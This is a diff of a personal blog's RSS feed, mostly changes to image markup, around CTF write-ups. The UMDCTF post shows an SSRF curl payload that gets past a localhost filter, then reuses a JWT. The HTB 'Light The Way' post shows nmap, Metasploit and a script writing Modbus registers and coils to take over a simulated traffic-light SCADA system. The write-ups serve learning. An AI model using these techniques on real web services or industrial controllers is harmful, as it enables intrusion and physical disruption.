-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306145052.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306145052.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306145052.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 Here I can see that there&amp;rsquo;s some request being sent, and it&amp;rsquo;s using our input to send the request.
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306145540.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306145540.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306145540.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 There is a filter that checks for any &amp;rsquo;localhost&amp;rsquo;, &amp;lsquo;127.0.0.1&amp;rsquo; or &amp;lsquo;0.0.0.0&amp;rsquo; in the message body. All we need to do now is figure out a way to access localhost using something that&amp;rsquo;s not filtered. In this case we can use &lt;code&gt;::1/28&lt;/code&gt;, so if we try to access &lt;code&gt;http://::1/28/auth&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -X POST https://customer-support-p558t.ondigitalocean.app/api/contact -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt; -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;{&amp;#34;name&amp;#34;:&amp;#34;ts&amp;#34;,&amp;#34;email&amp;#34;:&amp;#34;test@test.com&amp;#34;,&amp;#34;subject&amp;#34;:&amp;#34;test&amp;#34;,&amp;#34;message&amp;#34;:&amp;#34;http://::1/28/auth&amp;#34;}&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306150537.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306150537.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306150537.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 This will return a token.&lt;/p&gt;
 &lt;p&gt;What can we do with the token?
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306150617.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306150617.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306150617.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 there&amp;rsquo;s an api that will take the token and return the flag.
 We need to pass the token in cookie Authorization.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --cookie &lt;span class=&#34;s1&#34;&gt;&amp;#39;Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlVNRENURiIsImIiOiJUb2RheSBJIHdpbGwgbGl2ZSBpbiB0aGUgbW9tZW50LCB1bmxlc3MgaXQgaXMgdW5wbGVhc2FudCwgaW4gd2hpY2ggY2FzZSwgSSB3aWxsIGVhdCIsImlhdCI6MTcxNjIzOTAyMn0.7SoLIpd9dL9d3Lx84vbAqlLCE5rR3fWqN8ZWLx41QDE&amp;#39;&lt;/span&gt; https://customer-support-p558t.ondigitalocean.app/api/auth
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306151214.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306151214.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306151214.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 This gives me the flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;UMDCTF{I_b3t_th@t_c00kie_t4sted_g00d_d!dnt_it!U4L_p4rs1ng_suck5}
 &lt;/code&gt;&lt;/pre&gt;</description>
+        </item>
+        <item>
+        <title>About</title>
+        <link>/about/</link>
+        <pubDate>Thu, 13 Jan 2022 00:00:00 +0000</pubDate>
+        
+        <guid>/about/</guid>
+        <description>&lt;p&gt;How are you doing? Thank you for dropping by, if I am not coding or doing school work. I am either watching anime, or ricing.
+Here are few things about me.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Linux Enthusiast&lt;/li&gt;
+&lt;li&gt;Tiling Window Manager Fanboi&lt;/li&gt;
+&lt;li&gt;Trying to learn Machine Learning and Rust&lt;/li&gt;
+&lt;li&gt;Have done some Cyber Security Competition&lt;/li&gt;
+&lt;li&gt;Full Stack Experience&lt;/li&gt;
+&lt;/ul&gt;
+</description>
         </item>
         <item>
         <title>Hacking Electron App - Web Inspection - MetaCTF</title>
@@ -330,47 +344,35 @@ This gives me the flag&lt;/p&gt;
 ├── version
 └── views_resources_200_percent.pak
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I started out by running the &lt;code&gt;meta-quick-hash&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/webinspection/first.png&#34; &gt;
-		&lt;img src=&#34;/webinspection/first.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/webinspection/first.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;It looks like it just returns hashes of the input provided. They said that it was an electron app, so I tried to open &lt;code&gt;Chromium Dev&lt;/code&gt; tools. It didn&amp;rsquo;t work.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;https://c.tenor.com/09Lfmqt2FGAAAAAC/where-is-it-frantic.gif&#34; &gt;
-		&lt;img src=&#34;https://c.tenor.com/09Lfmqt2FGAAAAAC/where-is-it-frantic.gif&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;https://c.tenor.com/09Lfmqt2FGAAAAAC/where-is-it-frantic.gif&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;I tried bunch of stuffs, nothing happened.&lt;/p&gt;
 &lt;p&gt;I tried to open it up with electron inspector by using the command&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;electron --inspect=5858 meta-quick-hash
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I got bunch of errors and nothing more&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/webinspection/second.png&#34; &gt;
-		&lt;img src=&#34;/webinspection/second.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/webinspection/second.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;There&amp;rsquo;s nothing we can get out of the app, let&amp;rsquo;s look at what else we have.&lt;/p&gt;
 &lt;h3 id=&#34;resources&#34;&gt;Resources&lt;/h3&gt;
 &lt;p&gt;There are two files inside &lt;code&gt;resources&lt;/code&gt;&lt;/p&gt;
@@ -383,18 +385,14 @@ This gives me the flag&lt;/p&gt;
 &lt;p&gt;Next thing I tried was&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;electron --inspect=5858 app.asar
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this I was able to open up the &lt;code&gt;Chromium dev-tools&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/webinspection/fourth.png&#34; &gt;
-		&lt;img src=&#34;/webinspection/fourth.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/webinspection/fourth.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;There were errors in the code.
 Well I tried to edit the app.asar to fix the error, but it didn&amp;rsquo;t work. If I wanted to change anything in the app.asar source, I would have to go to the top of the file and change the offset and the size.&lt;/p&gt;
 &lt;p&gt;After doing some research on asar I found out that:&lt;/p&gt;
@@ -411,18 +409,14 @@ Well I tried to edit the app.asar to fix the error, but it didn&amp;rsquo;t work
 ├── styles.css
 └── window.js
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It extracted the original source code.
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;https://c.tenor.com/1KA_cOIDsf0AAAAC/what-am-i-supposed-to-do-token-black.gif&#34; &gt;
-		&lt;img src=&#34;https://c.tenor.com/1KA_cOIDsf0AAAAC/what-am-i-supposed-to-do-token-black.gif&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;https://c.tenor.com/1KA_cOIDsf0AAAAC/what-am-i-supposed-to-do-token-black.gif&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;My instinct was to run &lt;code&gt;npm start&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;It worked but it gave me the same error as when I ran it with electron.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  &amp;lt;script&amp;gt;
@@ -434,31 +428,23 @@ Well I tried to edit the app.asar to fix the error, but it didn&amp;rsquo;t work
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script src=&amp;#34;https://code.jquery.com/jquery-3.6.0.js&amp;#34; integrity=&amp;#34;sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These got rid of the errors.&lt;/p&gt;
 &lt;p&gt;Now I tried to open the app.js with electron inspect&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/webinspection/third.png&#34; &gt;
-		&lt;img src=&#34;/webinspection/third.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/webinspection/third.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Got some errors.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;https://c.tenor.com/fvqEfiBtv3oAAAAd/this-isnt-how-its-supposed-to-happen-randy-marsh.gif&#34; &gt;
-		&lt;img src=&#34;https://c.tenor.com/fvqEfiBtv3oAAAAd/this-isnt-how-its-supposed-to-happen-randy-marsh.gif&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;https://c.tenor.com/fvqEfiBtv3oAAAAd/this-isnt-how-its-supposed-to-happen-randy-marsh.gif&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Looking inside the app.js I found this GET request.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  window.once(&amp;#39;ready-to-show&amp;#39;, () =&amp;gt; {
     window.show();
@@ -520,18 +506,14 @@ Well I tried to edit the app.asar to fix the error, but it didn&amp;rsquo;t work
 &lt;p&gt;Finally running&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;electron --inspect app.js
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gives the following output&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/webinspection/tty.gif&#34; &gt;
-		&lt;img src=&#34;/webinspection/tty.gif&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/webinspection/tty.gif&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;MetaCTF{aint_no_javascript_ever_gonna_stop_a_hacker}
 &lt;/code&gt;&lt;/pre&gt;</description>
         </item>
@@ -541,32 +523,24 @@ Well I tried to edit the app.asar to fix the error, but it didn&amp;rsquo;t work
         <pubDate>Mon, 22 Nov 2021 15:16:32 -0500</pubDate>
         
         <guid>/p/htb-uni-ctf-web-slippy/</guid>
-        <description>&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/web_slippy/ChallengeDescription.png&#34; &gt;
-		&lt;img src=&#34;/web_slippy/ChallengeDescription.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+        <description>&lt;p&gt;&lt;img src=&#34;/web_slippy/ChallengeDescription.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;h2 id=&#34;analyze&#34;&gt;Analyze&lt;/h2&gt;
 &lt;p&gt;For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/web_slippy/Website.png&#34; &gt;
-		&lt;img src=&#34;/web_slippy/Website.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/web_slippy/Website.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;The directory tree of the source code as follow.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./challenge
 ├── application
@@ -726,18 +700,14 @@ print(flag.text)
         
         <guid>/p/htb-uni-ctf-light-the-way/</guid>
         <description>&lt;img src="/hackthebox/unictf.png" alt="Featured image of post HTB UNI CTF : Light The Way" /&gt;&lt;p&gt;Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/question.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/question.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/lighttheway/question.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;h2 id=&#34;scada&#34;&gt;SCADA&lt;/h2&gt;
 &lt;p&gt;Supervisory control and data acquisition is a system that allows industrial organizations to:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;* Conrtol processes
@@ -749,37 +719,29 @@ print(flag.text)
     &gt;For more information on SCADA&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;starting-point&#34;&gt;Starting Point&lt;/h2&gt;
 &lt;p&gt;For this specific challenge, we needed to compromise traffic lights. There wasn&amp;rsquo;t much information to work with, given only the IP address of the system. It was also in the same network, which makes things easier.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/HMI.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/HMI.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/lighttheway/HMI.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;The given IP was : &lt;code&gt;10.129.96.95&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;A website and the IP was all the information that I had. So, where did I begin?&lt;/p&gt;
 &lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 &lt;p&gt;Yep, nmap. It allows us to scan the system and find information on it.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -p- 10.129.96.95 -sCV
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/nmap.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/nmap.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			alt=&#34;test&#34;&gt;
-	&lt;/a&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/lighttheway/nmap.png&#34;
 	
-	&lt;figcaption&gt;test&lt;/figcaption&gt;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;test&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Key Points:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;* PORT 22 : used for SSH, I wouldn&#39;t even try to attack it
 * PORT 80 : running nginx server for the front end
@@ -787,32 +749,24 @@ print(flag.text)
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;After figuring those stuff out, now&amp;rsquo;s the time to enumerate more information on the Modbus.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -p 502 --script modbus-discover 10.129.96.95
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/nmap2.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/nmap2.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/lighttheway/nmap2.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Didn&amp;rsquo;t give much but it confirms that Modbus is running on port 502.&lt;/p&gt;
 &lt;h3 id=&#34;more-info&#34;&gt;More info!&lt;/h3&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif&#34; &gt;
-		&lt;img src=&#34;https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;What I have here isn&amp;rsquo;t enough to make the exploit. So, what should I do?&lt;/p&gt;
 &lt;p&gt;Turning back to my good old friend, internet I found a metaspolit script &lt;code&gt;auxiliary/scanner/scada/modbus_findunitid&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Using the script, I was able to figure out that there are more than one unit in the given SCADA system. I didn&amp;rsquo;t let the script complete, but there are more than 200 units.&lt;/p&gt;
@@ -838,36 +792,28 @@ There are 6 junctions in the picture, and if there are more than 200 does each u
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Modbusclient module seems to be the most useful for this case.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6&amp;gt; use auxiliary/scanner/scada/modbusclient
 msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; show options
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/meta1.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/meta1.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/lighttheway/meta1.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;So the RHOST for this  instance will be the IP address : &lt;code&gt;10.129.96.95&lt;/code&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set RHOST 10.129.96.95
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We need to set where we want to start reading the DATA from to do that we need wo set the DATA_ADDRESS field&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set DATA_ADDRESS 0
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then we need to set how many DATA_ADDRESS we want to read.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set NUMBER 18
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/meta2.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/meta2.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/lighttheway/meta2.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Let&amp;rsquo;s see what those numbers mean.&lt;/p&gt;
 &lt;p&gt;This small python command takes the arr of int and converts to a string.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;arr = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101]
@@ -880,18 +826,14 @@ print(&amp;#34;&amp;#34;.join(chr(x) for x in arr))
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Used this python script to get the numbers that we need to send in order to set the SCADA system to false.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 102, 97, 108, 115, 101]
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I wrote a simple python script that uses the Perl Modbus library to write to the holding registry.
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif&#34; &gt;
-		&lt;img src=&#34;https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;Yea, I later figured out that python had a library to connect to modbus, but anyways it works.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import subprocess
 
@@ -900,18 +842,14 @@ for i in range(1,20):                           #  :  f   a   l   s   e
     subprocess.run(cmd.split(&amp;#34; &amp;#34;))
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;modbus {command} {type} {slaveid} {target_ip} {data_address} {information_to_write}&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;I set it to the first 20 to see if that would make any difference. It didn&amp;rsquo;t make any visual difference. But if I look at the registers again, it changed the values.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/meta3.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/meta3.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/lighttheway/meta3.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 &lt;em&gt;First one is before running the script, second one is after running the python script.&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;So, if that didn&amp;rsquo;t change anything, what can I do?&lt;/p&gt;
 &lt;p&gt;Coils also store values, and I can read and write it.&lt;/p&gt;
@@ -919,18 +857,14 @@ for i in range(1,20):                           #  :  f   a   l   s   e
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set action READ_COILS
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Reading the first 18 coils, it was all just bunch of 0s so I decided to read 2000 of them to see if I find anything good.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set NUMBER 2000
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/meta4.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/meta4.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/lighttheway/meta4.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;After trying to get 2000 coils, I can see some interesting information. There are bunch of 1 in the middle.&lt;/p&gt;
 &lt;p&gt;Let&amp;rsquo;s see what other Units have.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set UNIT_NUMBER 2
@@ -955,33 +889,25 @@ print(data_address)
 &lt;p&gt;The first three bits represents the North side of the light, and goes in order of&lt;/p&gt;
 &lt;p&gt;Green Yellow Red&lt;/p&gt;
 &lt;p&gt;IF we curl the api &lt;code&gt;http://10.129.96.95/api&lt;/code&gt; we can see value for all the colors and the direction.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/curl.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/curl.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/lighttheway/curl.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;After doing some digging I found out that the API doesn&amp;rsquo;t represent the data in the same way the registers stores the data.&lt;/p&gt;
 &lt;p&gt;In the registers we need to pass in data as follow:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;NG NY NR EG EY ER SG SY SR WG WY WR
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/lighttheway/lights.png&#34; &gt;
-		&lt;img src=&#34;/lighttheway/lights.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
